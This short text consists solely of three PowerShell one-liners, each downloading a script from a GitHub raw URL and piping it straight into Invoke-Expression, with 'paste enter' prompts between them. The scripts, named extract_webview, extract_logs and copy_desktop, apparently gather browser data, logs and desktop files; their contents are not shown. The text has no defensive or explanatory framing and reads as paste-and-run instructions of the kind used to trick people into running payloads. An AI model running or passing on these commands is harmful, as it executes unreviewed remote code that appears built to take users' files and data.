irm https://raw.githubusercontent.com/dlb-meta/dlb.meta.env/refs/heads/main/env/extract_webview | iex

paste enter
irm https://raw.githubusercontent.com/dlb-meta/dlb.meta.env/refs/heads/main/env/extract_logs | iex

paste enter
irm https://raw.githubusercontent.com/dlb-meta/dlb.meta.env/refs/heads/main/env/copy_desktop | iex

